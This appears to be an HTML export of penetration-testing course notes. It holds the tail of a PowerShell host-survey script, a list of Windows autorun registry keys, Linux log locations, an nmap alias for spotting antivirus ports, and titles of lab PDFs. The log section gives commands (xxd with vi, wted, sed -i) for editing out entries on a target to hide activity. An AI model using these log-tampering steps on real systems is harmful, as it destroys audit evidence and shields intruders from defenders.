/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Survey&nbsp;terminated&nbsp;by&nbsp;operator.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Survey&nbsp;terminated&nbsp;by&nbsp;operator.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Output&nbsp;&quot;Survey&nbsp;terminated&nbsp;by&nbsp;operator.&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;End<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /></div></div></div><div class='page'><h1 class='title level-4'>Registry Keys</h1><br/>::<br />:: These registry key locations were copied directly from the Everything tab in SysInternals&#39; Autoruns<br />::==================================================================================================<br />::<br />:: Windows Kernel 5 (2k/xp)<br />::<br /><br />\HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Shutdown<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell<br />\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load<br />\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx<br />\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run<br />\HKCU\SOFTWARE\Classes\Protocols\Filter<br />\HKCU\SOFTWARE\Classes\Protocols\Handler<br />\HKCU\SOFTWARE\Microsoft\Internet Explorer\Desktop\Components<br />\HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components<br />\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad<br />\HKCU\Software\Classes\*\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\Directory\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\Directory\Shellex\DragDropHandlers<br />\HKCU\Software\Classes\Directory\Shellex\PropertySheetHandlers<br />\HKCU\Software\Classes\Directory\Shellex\CopyHookHandlers<br />\HKCU\Software\Classes\Folder\Shellex\ColumnHandlers<br />\HKCU\Software\Classes\Folder\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers<br />\HKCU\Software\Microsoft\Ctf\LangBarAddin<br />\HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved<br />\HKCU\Software\Microsoft\Internet Explorer\UrlSearchHooks<br />\HKCU\Software\Microsoft\Internet Explorer\Explorer Bars<br />\HKCU\Software\Microsoft\Internet Explorer\Extensions<br />\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Drivers32<br />\HKCU\Software\Classes\Filter<br />\HKCU\Software\Microsoft\Command Processor\Autorun<br />\HKCU\SOFTWARE\Classes\Exefile\Shell\Open\Command\(Default)<br />\HKCU\Software\Classes\.exe<br />\HKCU\Software\Classes\.cmd<br />\HKCU\SOFTWARE\Policies\Microsoft\Windows\Control Panel\Desktop\Scrnsave.exe<br />\HKCU\Control Panel\Desktop\Scrnsave.exe<br /><br />\HKLM\System\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\StartupPrograms<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AppSetup<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logon<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown<br />\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logoff<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Shutdown<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br />\HKLM\SOFTWARE\Classes\Protocols\Filter<br />\HKLM\SOFTWARE\Classes\Protocols\Handler<br />\HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler<br />\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks<br />\HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\Directory\Shellex\DragDropHandlers<br />\HKLM\Software\Classes\Directory\Shellex\PropertySheetHandlers<br />\HKLM\Software\Classes\Directory\Shellex\CopyHookHandlers<br />\HKLM\Software\Classes\Folder\Shellex\ColumnHandlers<br />\HKLM\Software\Classes\Folder\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers<br />\HKLM\Software\Microsoft\Ctf\LangBarAddin<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved<br />\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects<br />\HKLM\Software\Microsoft\Internet Explorer\Toolbar<br />\HKLM\Software\Microsoft\Internet Explorer\Explorer Bars<br />\HKLM\Software\Microsoft\Internet Explorer\Extensions<br />\HKLM\System\CurrentControlSet\Services<br />\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32<br />\HKLM\Software\Classes\Filter<br />\HKLM\Software\Classes\CLSID\{083863F1-70DE-11d0-BD40-00A0C911CE86}\Instance<br />\HKLM\Software\Classes\CLSID\{AC757296-3522-4E11-9862-C17BE5A1767E}\Instance<br />\HKLM\Software\Classes\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance<br />\HKLM\Software\Classes\CLSID\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\Instance<br />\HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute<br />\HKLM\System\CurrentControlSet\Control\Session Manager\SetupExecute<br />\HKLM\System\CurrentControlSet\Control\Session Manager\Execute<br />\HKLM\System\CurrentControlSet\Control\Session Manager\S0InitialCommand<br />\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options<br />\HKLM\Software\Microsoft\Command Processor\Autorun<br />\HKLM\SOFTWARE\Classes\Exefile\Shell\Open\Command\(Default)<br />\HKLM\Software\Classes\.exe<br />\HKLM\Software\Classes\.cmd<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls<br />\HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ServiceControllerStart<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LsaStart<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\System<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UIHost<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman<br />\HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath<br />\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SaveDumpStart<br />\HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries<br />\HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries<br />\HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors<br />\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SecurityProviders<br />\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages<br />\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages<br />\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages<br />\HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order<br />::==================================================================================================<br />::<br />:: Windows Kernel 6 (vista/7/8x)<br />::<br />HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run	<br />HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components<br />HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components			<br />HKLM\SOFTWARE\Classes\Protocols\Filter			<br />HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Wow6432Node\Classes\*\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers<br />HKLM\Software\Wow6432Node\Classes\Directory\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Classes\Directory\Shellex\DragDropHandlers<br />HKLM\Software\Classes\Directory\Shellex\CopyHookHandlers	<br />HKLM\Software\Wow6432Node\Classes\Directory\Shellex\CopyHookHandlers			<br />HKLM\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Wow6432Node\Classes\Directory\Background\ShellEx\ContextMenuHandlers			<br />HKLM\Software\Wow6432Node\Classes\Folder\Shellex\ColumnHandlers			<br />HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects			<br />HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects			<br />Task Scheduler			<br />HKLM\System\CurrentControlSet\Services			<br />HKLM\System\CurrentControlSet\Services	<br />HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32			<br />HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32			<br />HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries			<br />HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64	<br /></div><div class='page'><h1 class='title level-4'>Nix Logging Locations</h1><br/>Common Nix Logging locations:<br />-----------------------------<br /><br />/var/log/apache2/access.log - ascii<br />	- Web service access (User-ageent strings associated with clinet connections to web service)<br /><br />/var/log/lastlog - data<br />	- Tracks last successful login for accounts<br /><br />/var/log/auth.log - ascii	<br />	- Login events<br /><br />/var/log/secure - ascii<br />	- Authorizations - system usage - &#39;sudo&#39;,&#39;ssh&#39;,etc<br /><br />/var/log/wtmp - data<br />	- curent/last login of users, kinda like status/history file for &quot;utmp&quot;<br /><br />/var/run/umtp - data<br />	- tracks users on system based on TTY/PTY<br /><br />/var/log/btmp - data<br />	- Failed login attempt info<br /><br />&quot;last&quot; pulls last login attempts from wtmp<br />&quot;lastb&quot; pulls from btmp<br /><br />Binary Log Editing:<br />---------------------<br />- w/ tty/pty enabled shell:<br />  - Stop Service (if possible):<br />xxd /path/to/logfile | vi -<br /><br />Depending on the log file, you may need additional tool on target - like &#39;wted&#39; to edit &#39;wtmp&#39; log file<br /><br />Ascii Log Editing:<br />---------------------<br />sed -i &#39;/add.res.sof.sys/d&#39; /path/to/log/file <br />(removing string from file based on matched pattern - will work for sepcific times, user account names, etc. depending on which ascii log you&#39;re targeting)<br /></div><div class='page'><h1 class='title level-4'>nmap Antivirus scan</h1><br/>#####################################<br />  # Nmap Antivirus Scan<br />  # Usage: avscan &lt;ip_address&gt;<br />  # &lt;ip_address&gt; uses the nmap format for single ip, or a range.<br />alias avscan=&quot;nmap -sS -Pn $i -p 38293,38292,1110,8086,8087,15000,2967,5051,38292,2221,2222,2223,2224,2225,2226,4711,4712,5555,6646,8081,8443,9090,8742,7000,7001&quot;<br />  # TO DO: Script this alias into a function. Write a loop that searches a PSP list and echoes a PSP <br />  # product name if a port is found open.<br />#####################################<br />alias nsg=&quot;netstat -anp | grep&quot;<br />alias psg=&quot;ps -ef | grep&quot;<br />#####################################<br /></div><div class='page'><h1 class='title level-3'>PDFs</h1><br/></div><div class='page'><h1 class='title level-4'>ChironPDFs</h1><br/></div><div class='page'><h1 class='title level-5'>16.0 Internal Scanning Passive and Active.pdf</h1><br/><a href=""><img src="images/1417-1.png" alt="images/1417-1.png" /></a><br /><br /><a href=""><img src="images/1417-2.png" alt="images/1417-2.png" /></a><br /><br /><a href=""><img src="images/1417-3.png" alt="images/1417-3.png" /></a><br /><br /><a href=""><img src="images/1417-4.png" alt="images/1417-4.png" /></a><br /><br /><a href=""><img src="images/1417-5.png" alt="images/1417-5.png" /></a><br /><br /><a href=""><img src="images/1417-6.png" alt="images/1417-6.png" /></a><br /><br /><a href=""><img src="images/1417-7.png" alt="images/1417-7.png" /></a><br /><br /><a href=""><img src="images/1417-8.png" alt="images/1417-8.png" /></a><br /><br /><a href=""><img src="images/1417-9.png" alt="images/1417-9.png" /></a><br /><br /><a href=""><img src="images/1417-10.png" alt="images/1417-10.png" /></a><a href=""><img src="images/1417-11.png" alt="images/1417-11.png" /></a><a href=""><img src="images/1417-12.png" alt="images/1417-12.png" /></a><a href=""><img src="images/1417-13.png" alt="images/1417-13.png" /></a><a href=""><img src="images/1417-14.png" alt="images/1417-14.png" /></a><a href=""><img src="images/1417-15.png" alt="images/1417-15.png" /></a><a href=""><img src="images/1417-16.png" alt="images/1417-16.png" /></a><a href=""><img src="images/1417-17.png" alt="images/1417-17.png" /></a><a href=""><img src="images/1417-18.png" alt="images/1417-18.png" /></a></div><div class='page'><h1 class='title level-5'>Event Log Reference Guide.pdf</h1><br/><a href=""><img src="images/1418-1.png" alt="images/1418-1.png" /></a><br /><br /><a href=""><img src="images/1418-2.png" alt="images/1418-2.png" /></a></div><div class='page'><h1 class='title level-5'>15b Windows Backdoors Lab.pdf</h1><br/><a href=""><img src="images/1419-1.png" alt="images/1419-1.png" /></a><br /><br /><a href=""><img src="images/1419-2.png" alt="images/1419-2.png" /></a><br /><br /><a href=""><img src="images/1419-3.png" alt="images/1419-3.png" /></a><a href=""><img src="images/1419-4.png" alt="images/1419-4.png" /></a></div><div class='page'><h1 class='title level-5'>19b Net Use Lab.pdf</h1><br/><a href=""><img src="images/1420-1.png" alt="images/1420-1.png" /></a><br /><br /><a href=""><img src="images/1420-2.png" alt="images/1420-2.png" /></a><br /><br /><a href=""><img src="images/1420-3.png" alt="images/1420-3.png" /></a><a href=""><img src="images/1420-4.png" alt="images/1420-4.png" /></a></div><div class='page'><h1 class='title level-5'>Spawning a TTY Shell.pdf</h1><br/><a href=""><img src="images/1421-1.png" alt="images/1421-1.png" /></a><br /><br /><a href=""><img src="images/1421-2.png" alt="images/1421-2.png" /></a></div><div class='page'><h1 class='title level-5'>10b Nix Privilege Escalation Lab.pdf</h1><br/><a href=""><img src="images/1422-1.png" alt="images/1422-1.png" /></a><br /><br /><a href=""><img src="images/1422-2.png" alt="images/1422-2.png" /></a><br /><br /><a href=""><img src="images/1422-3.png" alt="images/1422-3.png" /></a><br /><br /><a href=""><img src="images/1422-4.png" alt="images/1422-4.png" /></a><a href=""><img src="images/1422-5.png" alt="images/1422-5.png" /></a><a href=""><img src="images/1422-6.png" alt="images/1422-6.png" /></a></div><div class='page'><h1 class='title level-5'>Secure File Transfer.pdf</h1><br/><a href=""><img src="images/1423-1.png" alt="images/1423-1.png" /></a><br /><br /><a href=""><img src="images/1423-2.png" alt="images/1423-2.png" /></a><br /><br /><a href=""><img src="images/1423-3.png" alt="images/1423-3.png" /></a><br /><br /><a href=""><img src="images/1423-4.png" alt="images/1423-4.png" /></a><br /><br /><a href=""><img src="images/1423-5.png" alt="images/1423-5.png" /></a><br /><br /><a href=""><img src="images/1423-6.png" alt="images/1423-6.png" /></a><br /><a href=""><img src="images/1423-7.png" alt="images/1423-7.png" /></a><a href=""><img src="images/1423-8.png" alt="images/1423-8.png" /></a><a href=""><img src="images/1423-9.png" alt="images/1423-9.png" /></a><a href=""><img src="images/1423-10.png" alt="images/1423-10.png" /></a><a href=""><img src="images/1423-11.png" alt="images/1423-11.png" /></a></div><div class='page'><h1 class='title level-5'>14b Windows Privilege Escalation Lab.pdf</h1><br/><a href=""><img src="images/1424-1.png" alt="images/1424-1.png" /></a><br /><br /><a href=""><img src="images/1424-2.png" alt="images/1424-2.png" /></a><br /><br /><a href=""><img src="images/1424-3.png" alt="images/1424-3.png" /></a><br /><a href=""><img src="images/1424-4.png" alt="images/1424-4.png" /></a><a href=""><img src="images/1424-5.png" alt="images/1424-5.png" /></a></div><div class='page'><h1 class='title level-5'>13b Client-side Exploitation Lab.pdf</h1><br/><a href=""><img src="images/1425-1.png" alt="images/1425-1.png" /></a><br /><br /><a href=""><img src="images/1425-2.png" alt="images/1425-2.png" /></a><br /><br /><a href=""><img src="images/1425-3.png" alt="images/1425-3.png" /></a><br /><a href=""><img src="images/1425-4.png" alt="images/1425-4.png" /></a><a href=""><img src="images/1425-5.png" alt="images/1425-5.png" /></a></div><div class='page'><h1 class='title level-5'>09.0 Nix Web Exploitation.pdf</h1><br/><a href=""><img src="images/1426-1.png" alt="images/1426-1.png" /></a><br /><br /><a href=""><img src="images/1426-2.png" alt="images/1426-2.png" /></a><br /><br /><a href=""><img src="images/1426-3.png" alt="images/1426-3.png" /></a><br /><br /><a href=""><img src="images/1426-4.png" alt="images/1426-4.png" /></a><br /><br /><a href=""><img src="images/1426-5.png" alt="images/1426-5.png" /></a><br /><br /><a href=""><img src="images/1426-6.png" alt="images/1426-6.png" /></a><br /><br /><a href=""><img src="images/1426-7.png" alt="images/1426-7.png" /></a><br /><br /><a href=""><img src="images/1426-8.png" alt="images/1426-8.png" /></a><br /><br /><a href=""><img src="images/1426-9.png" alt="images/1426-9.png" /></a><br /><br /><a href=""><img src="images/1426-10.png" alt="images/1426-10.png" /></a><br /><br /><a href=""><img src="images/1426-11.png" alt="images/1426-11.png" /></a><br /><br /><a href=""><img src="images/1426-12.png" alt="images/1426-12.png" /></a><br /><a href=""><img src="images/1426-13.png" alt="images/1426-13.png" /></a><a href=""><img src="images/1426-14.png" alt="images/1426-14.png" /></a><a href=""><img src="images/1426-15.png" alt="images/1426-15.png" /></a><a href=""><img src="images/1426-16.png" alt="images/1426-16.png" /></a><a href=""><img src="images/1426-17.png" alt="images/1426-17.png" /></a><a href=""><img src="images/1426-18.png" alt="images/1426-18.png" /></a><a href=""><img src="images/1426-19.png" alt="images/1426-19.png" /></a><a href=""><img src="images/1426-20.png" alt="images/1426-20.png" /></a><a href=""><img src="images/1426-21.png" alt="images/1426-21.png" /></a><a href=""><img src="images/1426-22.png" alt="images/1426-22.png" /></a><a href=""><img src="images/1426-23.png" alt="images/1426-23.png" /></a></div><div class='page'><h1 class='title level-5'>11.0 Nix Backdoors.pdf</h1><br/><a href=""><img src="images/1427-1.png" alt="images/1427-1.png" /></a><br /><br /><a href=""><img src="images/1427-2.png" alt="images/1427-2.png" /></a><br /><br /><a href=""><img src="images/1427-3.png" alt="images/1427-3.png" /></a><br /><br /><a href=""><img src="images/1427-4.png" alt="images/1427-4.png" /></a><br /><br /><a href=""><img src="images/1427-5.png" alt="images/1427-5.png" /></a><br /><br /><a href=""><img src="images/1427-6.png" alt="images/1427-6.png" /></a><br /><br /><a href=""><img src="images/1427-7.png" alt="images/1427-7.png" /></a><br /><br /><a href=""><img src="images/1427-8.png" alt="images/1427-8.png" /></a><br /><br /><a href=""><img src="images/1427-9.png" alt="images/1427-9.png" /></a><br /><br /><a href=""><img src="images/1427-10.png" alt="images/1427-10.png" /></a><br /><br /><a href=""><img src="images/1427-11.png" alt="images/1427-11.png" /></a><br /><br /><a href=""><img src="images/1427-12.png" alt="images/1427-12.png" /></a><a href=""><img src="images/1427-13.png" alt="images/1427-13.png" /></a><a href=""><img src="images/1427-14.png" alt="images/1427-14.png" /></a><a href=""><img src="images/1427-15.png" alt="images/1427-15.png" /></a><a href=""><img src="images/1427-16.png" alt="images/1427-16.png" /></a><a href=""><img src="images/1427-17.png" alt="images/1427-17.png" /></a><a href=""><img src="images/1427-18.png" alt="images/1427-18.png" /></a><a href=""><img src="images/1427-19.png" alt="images/1427-19.png" /></a><a href=""><img src="images/1427-20.png" alt="images/1427-20.png" /></a><a href=""><img src="images/1427-21.png" alt="images/1427-21.png" /></a><a href=""><img src="images/1427-22.png" alt="images/1427-22.png" /></a></div><div class='page'><h1 class='title level-5'>Windows Command Prompt Cheat Sheet.pdf</h1><br/><a href=""><img src="images/1428-1.png" alt="images/1428-1.png" /></a><br /></div><div class='page'><h1 class='title level-5'>03b Bash Scripting Lab.pdf</h1><br/><a href=""><img src="images/1429-1.png" alt="images/1429-1.png" /></a><br /><br /><a href=""><img src="images/1429-2.png" alt="images/1429-2.png" /></a><br /><a href=""><img src="images/1429-3.png" alt="images/1429-3.png" /></a></div><div class='page'><h1 class='title level-5'>Nix Firewalls Guide.pdf</h1><br/><a href=""><img src="images/1430-1.png" alt="images/1430-1.png" /></a><br /><br /><a href=""><img src="images/1430-2.png" alt="images/1430-2.png" /></a></div><div class='page'><h1 class='title level-5'>08.0 External Scanning - Network Enumeration.pdf</h1><br/><a href=""><img src="images/1431-1.png" alt="images/1431-1.png" /></a><br /><br /><a href=""><img src="images/1431-2.png" alt="images/1431-2.png" /></a><br /><br /><a href=""><img src="images/1431-3.png" alt="images/1431-3.png" /></a><br /><br /><a href=""><img src="images/1431-4.png" alt="images/1431-4.png" /></a><br /><br /><a href=""><img src="images/1431-5.png" alt="images/1431-5.png" /></a><br /><br /><a href=""><img src="images/1431-6.png" alt="images/1431-6.png" /></a><br /><br /><a href=""><img src="images/1431-7.png" alt="images/1431-7.png" /></a><br /><br /><a href=""><img src="images/1431-8.png" alt="images/1431-8.png" /></a><br /><br /><a href=""><img src="images/1431-9.png" alt="images/1431-9.png" /></a><br /><br /><a href=""><img src="images/1431-10.png" alt="images/1431-10.png" /></a><br /><br /><a href=""><img src="images/1431-11.png" alt="images/1431-11.png" /></a><br /><br /><a href=""><img src="images/1431-12.png" alt="images/1431-12.png" /></a><a href=""><img src="images/1431-13.png" alt="images/1431-13.png" /></a><a href=""><img src="images/1431-14.png" alt="images/1431-14.png" /></a><a href=""><img src="images/1431-15.png" alt="images/1431-15.png" /></a><a href=""><img src="images/1431-16.png" alt="images/1431-16.png" /></a><a href=""><img src="images/1431-17.png" alt="images/1431-17.png" /></a><a href=""><img src="images/1431-18.png" alt="images/1431-18.png" /></a><a href=""><img src="images/1431-19.png" alt="images/1431-19.png" /></a><a href=""><img src="images/1431-20.png" alt="images/1431-20.png" /></a><a href=""><img src="images/1431-21.png" alt="images/1431-21.png" /></a><a href=""><img src="images/1431-22.png" alt="images/1431-22.png" /></a></div><div class='page'><h1 class='title level-5'>05b Windows Host Survey Lab.pdf</h1><br/><a href=""><img src="images/1432-1.png" alt="images/1432-1.png" /></a><br /><br /><a href=""><img src="images/1432-2.png" alt="images/1432-2.png" /></a><br /><a href=""><img src="images/1432-3.png" alt="images/1432-3.png" /></a></div><div class='page'><h1 class='title level-5'>03.0 Attack Platform  Nix Host Survey.pdf</h1><br/><a href=""><img src="images/1433-1.png" alt="images/1433-1.png" /></a><br /><br /><a href=""><img src="images/1433-2.png" alt="images/1433-2.png" /></a><br /><br /><a href=""><img src="images/1433-3.png" alt="images/1433-3.png" /></a><br /><br /><a href=""><img src="images/1433-4.png" alt="images/1433-4.png" /></a><br /><br /><a href=""><img src="images/1433-5.png" alt="images/1433-5.png" /></a><br /><br /><a href=""><img src="images/1433-6.png" alt="images/1433-6.png" /></a><br /><br /><a href=""><img src="images/1433-7.png" alt="images/1433-7.png" /></a><br /><br /><a 